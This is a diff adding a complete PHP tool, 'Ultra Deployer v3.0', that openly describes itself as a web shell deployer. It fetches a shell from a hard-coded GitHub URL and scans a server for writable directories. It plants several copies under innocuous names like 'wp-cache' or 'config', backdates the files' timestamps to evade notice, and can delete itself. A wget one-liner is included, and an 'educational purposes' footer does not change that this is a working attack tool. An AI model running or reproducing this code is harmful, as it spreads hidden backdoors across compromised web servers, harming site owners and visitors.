@@ -1,0 +1,769 @@
+<?php
+/*
+╔══════════════════════════════════════════════════════════════════╗
+║  🚀 ULTRA DEPLOYER v3.0 - Professional Web Shell Deployer     ║
+║  ═══════════════════════════════════════════════════════════════ ║
+║  Fitur: Download from URL | Auto Scan | Mass Deploy | Stealth  ║
+║  ═══════════════════════════════════════════════════════════════ ║
+║  Cara Pakai:                                                    ║
+║  1. Upload script ke server                                     ║
+║  2. Akses via browser: https://domain.com/deploy.php           ║
+║  3. Masukkan URL shell & jumlah copy                           ║
+║  4. Klik DEPLOY!                                               ║
+╚══════════════════════════════════════════════════════════════════╝
+*/
+
+// ==================== KONFIGURASI ====================
+$CONFIG = [
+    'max_depth' => 5,           // Kedalaman scan direktori
+    'max_copies' => 20,         // Maksimal copy per deploy
+    'default_copies' => 5,      // Default jumlah copy
+    'timeout' => 30,            // Timeout download (detik)
+    'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    'default_url' => 'https://raw.githubusercontent.com/khrisnaaditya920-lang/khcebol/refs/heads/main/puluttwo',
+    'self_delete' => false,     // Hapus diri sendiri setelah deploy?
+];
+
+// ==================== FUNGSI UTILITY ====================
+
+/**
+ * Download konten dari URL dengan multiple method
+ */
+function downloadFromUrl($url, $timeout = 30) {
+    // Method 1: cURL
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_TIMEOUT => $timeout,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            CURLOPT_HEADER => false,
+        ]);
+        $content = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        if ($httpCode == 200 && !empty($content)) {
+            return $content;
+        }
+    }
+    
+    // Method 2: file_get_contents
+    if (ini_get('allow_url_fopen')) {
+        $context = stream_context_create([
+            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
+            'http' => ['timeout' => $timeout, 'header' => "User-Agent: Mozilla/5.0\r\n"]
+        ]);
+        $content = @file_get_contents($url, false, $context);
+        if (!empty($content)) {
+            return $content;
+        }
+    }
+    
+    return false;
+}
+
+/**
+ * Scan direktori writable secara rekursif
+ */
+function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
+    $result = [];
+    if ($currentDepth > $maxDepth || !is_dir($baseDir) || !is_readable($baseDir)) {
+        return $result;
+    }
+    
+    $items = @scandir($baseDir);
+    if (!$items) return $result;
+    
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        
+        $fullPath = rtrim($baseDir, '/') . '/' . $item;
+        if (is_dir($fullPath)) {
+            if (is_writable($fullPath) && $fullPath != '/') {
+                $result[] = $fullPath;
+            }
+            $result = array_merge($result, scanWritableDirs($fullPath, $maxDepth, $currentDepth + 1));
+        }
+    }
+    
+    return $result;
+}
+
+/**
+ * Generate random filename dari stock names
+ */
+function getRandomFilename() {
+    $stockNames = [
+        // WordPress style
+        'wp-optimize', 'wp-cache', 'wp-assets', 'wp-helpers',
+        // System style
+        'system', 'core', 'helper', 'data', 'service',
+        'storage', 'bootstrap', 'loader', 'bridge', 'gateway',
+        // Generic style
+        'config', 'settings', 'cache', 'temp', 'log',
+        'backup', 'session', 'debug', 'test', 'sample',
+        // Developer style
+        'api', 'endpoint', 'webhook', 'cron', 'task',
+        'mailer', 'smtp', 'db', 'sql', 'query',
+        // Hidden style
+        'notes', 'info', 'extra', 'draft', 'manual',
+        'archive', 'error', 'profile', 'user', 'admin'
+    ];
+    
+    $name = $stockNames[array_rand($stockNames)];
+    $random = substr(md5(uniqid(mt_rand(), true)), 0, 6);
+    return $name . '_' . $random . '.php';
+}
+
+/**
+ * Generate URL dari path file
+ */
+function generateUrl($filePath) {
+    $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);
+    $filePath = realpath($filePath);
+    
+    if (strpos($filePath, $docRoot) === 0) {
+        $relativePath = substr($filePath, strlen($docRoot));
+    } else {
+        $relativePath = str_replace($docRoot, '', $filePath);
+    }
+    
+    $relativePath = str_replace('\\', '/', $relativePath);
+    $relativePath = trim($relativePath, '/');
+    
+    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+    $host = $_SERVER['HTTP_HOST'];
+    
+    return $protocol . '://' . $host . '/' . $relativePath;
+}
+
+/**
+ * Deploy shell ke direktori target
+ */
+function deployShell($shellContent, $targetDirs, $maxCopies = 5) {
+    $results = [];
+    $successCount = 0;
+    
+    if (empty($shellContent)) {
+        return ['error' => 'Shell content is empty'];
+    }
+    
+    shuffle($targetDirs);
+    $targetDirs = array_slice($targetDirs, 0, $maxCopies);
+    
+    foreach ($targetDirs as $dir) {
+        $filename = getRandomFilename();
+        $targetPath = rtrim($dir, '/') . '/' . $filename;
+        
+        // Skip if file exists
+        if (file_exists($targetPath)) continue;
+        
+        // Write file
+        if (@file_put_contents($targetPath, $shellContent) !== false) {
+            @chmod($targetPath, 0644);
+            // Spoof timestamp (random date in past)
+            $randomTime = strtotime('-' . rand(0, 90) . ' days');
+            @touch($targetPath, $randomTime, $randomTime);
+            
+            $url = generateUrl($targetPath);
+            
+            $results[] = [
+                'filename' => $filename,
+                'path' => $targetPath,
+                'url' => $url,
+                'size' => strlen($shellContent),
+                'dir' => $dir
+            ];
+            $successCount++;
+        }
+    }
+    
+    return [
+        'success' => $successCount,
+        'total' => count($targetDirs),
+        'files' => $results,
+        'error' => null
+    ];
+}
+
+// ==================== HANDLE REQUEST ====================
+
+$message = null;
+$deployResult = null;
+$scannedDirs = null;
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $action = $_POST['action'] ?? '';
+    $url = $_POST['url'] ?? '';
+    $copies = min(max(1, intval($_POST['copies'] ?? $CONFIG['default_copies'])), $CONFIG['max_copies']);
+    
+    if ($action === 'deploy' && !empty($url)) {
+        // Download shell
+        $shellContent = downloadFromUrl($url, $CONFIG['timeout']);
+        
+        if (!$shellContent) {
+            $message = ['type' => 'error', 'text' => '❌ Gagal download shell dari URL. Cek koneksi atau URL.'];
+        } else {
+            // Scan writable directories
+            $writableDirs = scanWritableDirs(__DIR__, $CONFIG['max_depth']);
+            
+            if (empty($writableDirs)) {
+                $message = ['type' => 'error', 'text' => '❌ Tidak ada direktori writable yang ditemukan.'];
+            } else {
+                // Deploy
+                $deployResult = deployShell($shellContent, $writableDirs, $copies);
+                
+                if ($deployResult['success'] > 0) {
+                    $message = [
+                        'type' => 'success',
+                        'text' => "✅ Berhasil deploy {$deployResult['success']} dari {$deployResult['total']} target!"
+                    ];
+                } else {
+                    $message = ['type' => 'error', 'text' => '❌ Gagal deploy ke semua target.'];
+                }
+            }
+        }
+    } elseif ($action === 'scan') {
+        $scannedDirs = scanWritableDirs(__DIR__, $CONFIG['max_depth']);
+        if (!empty($scannedDirs)) {
+            $message = [
+                'type' => 'success',
+                'text' => "✅ Ditemukan " . count($scannedDirs) . " direktori writable!"
+            ];
+        } else {
+            $message = ['type' => 'error', 'text' => '❌ Tidak ada direktori writable ditemukan.'];
+        }
+    }
+}
+
+// ==================== HTML OUTPUT ====================
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚀 Ultra Deployer v3.0</title>
+    <style>
+        /* ===== RESET & BASE ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0e17;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+            color: #e6edf3;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+        }
+        
+        /* ===== CONTAINER ===== */
+        .container {
+            max-width: 1100px;
+            width: 100%;
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 16px;
+            padding: 35px 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            margin-top: 20px;
+        }
+        
+        /* ===== HEADER ===== */
+        .header {
+            text-align: center;
+            margin-bottom: 35px;
+            padding-bottom: 25px;
+            border-bottom: 1px solid #30363d;
+        }
+        .header .logo { font-size: 48px; display: block; margin-bottom: 8px; }
+        .header h1 {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+        .header .sub {
+            color: #8b949e;
+            font-size: 14px;
+            margin-top: 6px;
+            -webkit-text-fill-color: #8b949e;
+        }
+        .header .version {
+            display: inline-block;
+            background: #0d1117;
+            color: #00d4ff;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            border: 1px solid #30363d;
+            margin-top: 8px;
+        }
+        
+        /* ===== FORM ===== */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            color: #8b949e;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            letter-spacing: 0.3px;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 14px 18px;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 10px;
+            color: #e6edf3;
+            font-size: 15px;
+            font-family: inherit;
+            transition: all 0.3s ease;
+        }
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: #00d4ff;
+            box-shadow: 0 0 0 3px rgba(0,212,255,0.1);
+        }
+        .form-group input::placeholder { color: #484f58; }
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        
+        /* ===== BUTTONS ===== */
+        .btn-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 8px;
+        }
+        .btn {
+            padding: 16px 24px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #00d4ff, #0066ff);
+            color: #fff;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0,212,255,0.3);
+        }
+        .btn-secondary {
+            background: #0d1117;
+            color: #fdcb6e;
+            border: 1px solid #30363d;
+        }
+        .btn-secondary:hover {
+            background: #1c2333;
+            border-color: #fdcb6e;
+        }
+        .btn-success {
+            background: linear-gradient(135deg, #00b894, #00a86b);
+            color: #fff;
+        }
+        .btn-success:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0,200,100,0.3);
+        }
+        
+        /* ===== MESSAGE ===== */
+        .message {
+            padding: 16px 20px;
+            border-radius: 10px;
+            margin: 25px 0;
+            font-size: 14px;
+            border-left: 4px solid;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .message-success {
+            background: rgba(0, 184, 148, 0.08);
+            border-color: #00b894;
+            color: #7ee8c0;
+        }
+        .message-error {
+            background: rgba(255, 107, 107, 0.08);
+            border-color: #ff6b6b;
+            color: #ff9999;
+        }
+        .message-info {
+            background: rgba(0, 212, 255, 0.05);
+            border-color: #00d4ff;
+            color: #7ec8e8;
+        }
+        
+        /* ===== STATS ===== */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin: 20px 0 25px 0;
+        }
+        .stat-box {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 10px;
+            padding: 16px 20px;
+            text-align: center;
+        }
+        .stat-box .value {
+            font-size: 28px;
+            font-weight: 700;
+            color: #00d4ff;
+        }
+        .stat-box .label {
+            font-size: 11px;
+            color: #8b949e;
+            margin-top: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        /* ===== RESULT FILES ===== */
+        .result-files {
+            margin-top: 25px;
+            border-top: 1px solid #30363d;
+            padding-top: 25px;
+        }
+        .result-files h3 {
+            color: #00b894;
+            font-size: 16px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .file-item {
+            background: #0d1117;
+            border-left: 3px solid #00b894;
+            padding: 14px 18px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            transition: 0.2s;
+        }
+        .file-item:hover { background: #161b22; }
+        .file-item .info { flex: 1; min-width: 200px; }
+        .file-item .info .name { 
+            font-weight: 600; 
+            color: #00b894;
+            font-size: 14px;
+        }
+        .file-item .info .path { 
+            color: #8b949e; 
+            font-size: 12px; 
+            margin-top: 2px;
+            word-break: break-all;
+        }
+        .file-item .url a {
+            color: #00d4ff;
+            text-decoration: none;
+            font-size: 13px;
+            word-break: break-all;
+        }
+        .file-item .url a:hover { text-decoration: underline; }
+        .file-item .actions {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .file-item .actions .btn-sm {
+            padding: 6px 14px;
+            font-size: 11px;
+            border-radius: 6px;
+            border: 1px solid #30363d;
+            background: #0d1117;
+            color: #e6edf3;
+            cursor: pointer;
+            transition: 0.2s;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .file-item .actions .btn-sm:hover {
+            background: #1c2333;
+            border-color: #00d4ff;
+        }
+        .file-item .actions .btn-sm.open { color: #00d4ff; }
+        .file-item .actions .btn-sm.copy { color: #fdcb6e; }
+        
+        /* ===== QUICK COMMANDS ===== */
+        .quick-commands {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 10px;
+            padding: 16px 20px;
+            margin-top: 25px;
+        }
+        .quick-commands h4 {
+            color: #8b949e;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+        .quick-commands code {
+            display: block;
+            background: #000;
+            padding: 12px 16px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: #fdcb6e;
+            word-break: break-all;
+            border: 1px solid #30363d;
+            margin-bottom: 8px;
+        }
+        .quick-commands .cmd-hint {
+            color: #484f58;
+            font-size: 11px;
+        }
+        
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .container { padding: 20px; }
+            .form-row { grid-template-columns: 1fr; gap: 10px; }
+            .btn-group { grid-template-columns: 1fr; }
+            .file-item { flex-direction: column; align-items: stretch; }
+            .stats { grid-template-columns: 1fr 1fr; }
+            .header h1 { font-size: 24px; }
+        }
+        @media (max-width: 480px) {
+            .stats { grid-template-columns: 1fr; }
+        }
+        
+        /* ===== SCROLL ===== */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: #0d1117; }
+        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #484f58; }
+        
+        /* ===== ANIMATION ===== */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .fade-in { animation: fadeIn 0.3s ease-out; }
+    </style>
+</head>
+<body>
+<div class="container fade-in">
+    
+    <!-- ===== HEADER ===== -->
+    <div class="header">
+        <span class="logo">🚀</span>
+        <h1>Ultra Deployer</h1>
+        <div class="sub">Professional Web Shell Deployer</div>
+        <span class="version">v3.0</span>
+    </div>
+    
+    <!-- ===== FORM ===== -->
+    <form method="POST" id="deployForm">
+        <div class="form-group">
+            <label for="url">🔗 URL Shell (wget source)</label>
+            <input type="url" 
+                   id="url" 
+                   name="url" 
+                   value="<?php echo htmlspecialchars($_POST['url'] ?? $CONFIG['default_url']); ?>" 
+                   placeholder="https://raw.githubusercontent.com/user/shell.php" 
+                   required>
+        </div>
+        
+        <div class="form-row">
+            <div class="form-group">
+                <label for="copies">📦 Jumlah Copy (1-<?php echo $CONFIG['max_copies']; ?>)</label>
+                <input type="number" 
+                       id="copies" 
+                       name="copies" 
+                       min="1" 
+                       max="<?php echo $CONFIG['max_copies']; ?>" 
+                       value="<?php echo $_POST['copies'] ?? $CONFIG['default_copies']; ?>">
+            </div>
+            <div class="form-group" style="display:flex; align-items:flex-end;">
+                <div class="btn-group" style="width:100%;">
+                    <button type="submit" name="action" value="deploy" class="btn btn-primary">
+                        🚀 DEPLOY
+                    </button>
+                    <button type="submit" name="action" value="scan" class="btn btn-secondary">
+                        🔍 SCAN
+                    </button>
+                </div>
+            </div>
+        </div>
+    </form>
+    
+    <!-- ===== MESSAGE ===== -->
+    <?php if ($message): ?>
+    <div class="message message-<?php echo $message['type']; ?>">
+        <?php echo htmlspecialchars($message['text']); ?>
+    </div>
+    <?php endif; ?>
+    
+    <!-- ===== STATS ===== -->
+    <?php if ($deployResult && $deployResult['success'] > 0): ?>
+    <div class="stats">
+        <div class="stat-box">
+            <div class="value"><?php echo $deployResult['success']; ?></div>
+            <div class="label">Deployed</div>
+        </div>
+        <div class="stat-box">
+            <div class="value"><?php echo $deployResult['total']; ?></div>
+            <div class="label">Target</div>
+        </div>
+        <div class="stat-box">
+            <div class="value"><?php echo $deployResult['success'] > 0 ? number_format($deployResult['files'][0]['size'] ?? 0) : 0; ?></div>
+            <div class="label">Bytes / File</div>
+        </div>
+        <div class="stat-box">
+            <div class="value"><?php echo count($scannedDirs ?? scanWritableDirs(__DIR__, $CONFIG['max_depth'])); ?></div>
+            <div class="label">Writable Dirs</div>
+        </div>
+    </div>
+    <?php endif; ?>
+    
+    <!-- ===== QUICK COMMANDS ===== -->
+    <div class="quick-commands">
+        <h4>⚡ QUICK COMMAND (Copy & Run in Terminal)</h4>
+        <code>wget -O deploy.php "<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF']; ?>?url=<?php echo urlencode($CONFIG['default_url']); ?>"</code>
+        <div class="cmd-hint">💡 Jalankan di terminal untuk deploy otomatis dengan 1 perintah</div>
+    </div>
+    
+    <!-- ===== RESULT FILES ===== -->
+    <?php if ($deployResult && !empty($deployResult['files'])): ?>
+    <div class="result-files">
+        <h3>✅ Deployed Files (<?php echo count($deployResult['files']); ?>)</h3>
+        
+        <?php foreach ($deployResult['files'] as $index => $file): ?>
+        <div class="file-item">
+            <div class="info">
+                <div class="name">#<?php echo $index + 1; ?>: <?php echo htmlspecialchars($file['filename']); ?></div>
+                <div class="path">📁 <?php echo htmlspecialchars($file['path']); ?></div>
+            </div>
+            <div class="url">
+                <a href="<?php echo htmlspecialchars($file['url']); ?>" target="_blank">
+                    🔗 <?php echo htmlspecialchars($file['url']); ?>
+                </a>
+            </div>
+            <div class="actions">
+                <a href="<?php echo htmlspecialchars($file['url']); ?>" target="_blank" class="btn-sm open">🌐 Open</a>
+                <button onclick="copyUrl('<?php echo htmlspecialchars($file['url']); ?>')" class="btn-sm copy">📋 Copy</button>
+            </div>
+        </div>
+        <?php endforeach; ?>
+        
+        <!-- ===== BULK ACTIONS ===== -->
+        <div style="display:flex; gap:12px; margin-top:15px; flex-wrap:wrap;">
+            <button onclick="openAll()" class="btn btn-success" style="flex:1; padding:12px;">
+                🌐 Open All
+            </button>
+            <button onclick="copyAll()" class="btn btn-primary" style="flex:1; padding:12px;">
+                📋 Copy All URLs
+            </button>
+        </div>
+    </div>
+    <?php endif; ?>
+    
+    <!-- ===== SCAN RESULT ===== -->
+    <?php if ($scannedDirs && !empty($scannedDirs)): ?>
+    <div style="margin-top:25px; border-top:1px solid #30363d; padding-top:20px;">
+        <h3 style="color:#fdcb6e; font-size:16px; margin-bottom:12px;">📁 Writable Directories (<?php echo count($scannedDirs); ?>)</h3>
+        <div style="max-height:200px; overflow-y:auto; background:#0d1117; border-radius:8px; padding:12px; border:1px solid #30363d;">
+            <?php foreach (array_slice($scannedDirs, 0, 50) as $dir): ?>
+            <div style="padding:4px 0; font-size:13px; color:#8b949e; border-bottom:1px solid #1c2333;">
+                📂 <?php echo htmlspecialchars($dir); ?>
+            </div>
+            <?php endforeach; ?>
+            <?php if (count($scannedDirs) > 50): ?>
+            <div style="padding:4px 0; color:#484f58; font-size:12px;">
+                ... dan <?php echo count($scannedDirs) - 50; ?> direktori lainnya
+            </div>
+            <?php endif; ?>
+        </div>
+    </div>
+    <?php endif; ?>
+    
+    <!-- ===== FOOTER ===== -->
+    <div style="text-align:center; color:#30363d; font-size:12px; padding-top:30px; border-top:1px solid #30363d; margin-top:30px;">
+        🚀 Ultra Deployer v3.0 | 
+        <span style="color:#484f58;">For Educational Purposes Only</span>
+    </div>
+    
+</div>
+
+<!-- ===== JAVASCRIPT ===== -->
+<script>
+function copyUrl(url) {
+    navigator.clipboard.writeText(url).then(() => {
+        alert('✅ URL copied to clipboard!');
+    }).catch(() => {
+        // Fallback
+        const input = document.createElement('input');
+        input.value = url;
+        document.body.appendChild(input);
+        input.select();
+        document.execCommand('copy');
+        document.body.removeChild(input);
+        alert('✅ URL copied to clipboard!');
+    });
+}
+
+function copyAll() {
+    const urls = <?php echo json_encode(array_column($deployResult['files'] ?? [], 'url')); ?>;
+    if (!urls.length) return alert('No URLs to copy');
+    const text = urls.join('\n');
+    navigator.clipboard.writeText(text).then(() => {
+        alert('✅ ' + urls.length + ' URLs copied to clipboard!');
+    }).catch(() => {
+        const input = document.createElement('textarea');
+        input.value = text;
+        document.body.appendChild(input);
+        input.select();
+        document.execCommand('copy');
+        document.body.removeChild(input);
+        alert('✅ ' + urls.length + ' URLs copied to clipboard!');
+    });
+}
+
+function openAll() {
+    const urls = <?php echo json_encode(array_column($deployResult['files'] ?? [], 'url')); ?>;
+    if (!urls.length) return alert('No URLs to open');
+    urls.forEach(url => window.open(url, '_blank'));
+}
+</script>
+
+</body>
+</html>
+<?php
+// ==================== SELF DELETE (Optional) ====================
+if ($CONFIG['self_delete'] && ($_POST['action'] ?? '') === 'deploy') {
+    @unlink(__FILE__);
+}
+?>
